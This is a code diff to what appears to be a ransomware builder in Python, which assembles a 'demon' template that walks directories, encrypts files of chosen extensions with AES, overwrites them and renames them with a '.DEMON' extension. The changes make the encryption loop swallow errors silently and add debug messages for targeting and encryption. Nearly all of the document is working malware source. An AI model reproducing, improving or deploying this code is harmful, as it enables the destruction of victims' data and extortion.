@@ -54,11 +54,13 @@ def start_encrypt(p, key):
     try:
         for x in dirs:
             target = p + x + '/'
-
+            <debug>
+            
             for path, subdirs, files in os.walk(target):
                 for name in files:
                     for i in ext:
                         if name.endswith(i.lower()):
+                            <debug>
                             encrypt_file(os.path.join(path, name), key)
                             <debug>
                             c +=1
@@ -69,6 +71,7 @@ def start_encrypt(p, key):
 
         <destruct>
     except Exception as e:
+        <debug>
         pass # continue if error
 
 def connector():
@@ -218,23 +221,29 @@ def encrypt_file(file_name, key):
     with open(file_name, 'rb') as fo:
         plaintext = fo.read()
     enc = encrypt(plaintext, key)
-    with open(file_name, 'wb') as fo:
-        fo.write(enc)
-    os.rename(file_name, file_name + '.DEMON')
+    try:
+        with open(file_name, 'wb') as fo:
+            fo.write(enc)
+        os.rename(file_name, file_name + '.DEMON')
+    except Exception as e:
+        pass
 """
         demon = demon.replace('<import_random>', 'from Crypto import Random')
         demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')
         demon = demon.replace('<type>', type)
     elif type == 'pyaes':
         type ="""def encrypt_file(file_name, key):
-        aes = pyaes.AESModeOfOperationCTR(key)
+    aes = pyaes.AESModeOfOperationCTR(key)
 
-        with open(file_name, 'rb') as fo:
-            plaintext = fo.read()
-        enc = aes.encrypt(plaintext)
+    with open(file_name, 'rb') as fo:
+        plaintext = fo.read()
+    enc = aes.encrypt(plaintext)
+    try:
         with open(file_name, 'wb') as fo:
             fo.write(enc)
         os.rename(file_name, file_name + '.DEMON')
+    except Exception as e:
+        pass
 """
         demon = demon.replace('<import_random>', '')
         demon = demon.replace('<import_aes>', 'import pyaes')
@@ -243,7 +252,10 @@ def encrypt_file(file_name, key):
     if debug == 0:
         demon = demon.replace('<debug>', '')
     elif debug == 1:
-        demon = demon.replace('<debug>', "print('[ENCRYPTED] %s' % name)")
+        demon = demon.replace('<debug>', "print('[SEARCHING] Targeting %s' % target)", 1)
+        demon = demon.replace('<debug>', "print('[FOUND] %s' % name)", 1)
+        demon = demon.replace('<debug>', "print('[ENCRYPTED] %s' % name)", 1)
+        demon = demon.replace('<debug>', "print('[ERROR] %s' % e)", 1)
 
     if fullscreen == 1:
         # Insert fullscreen code
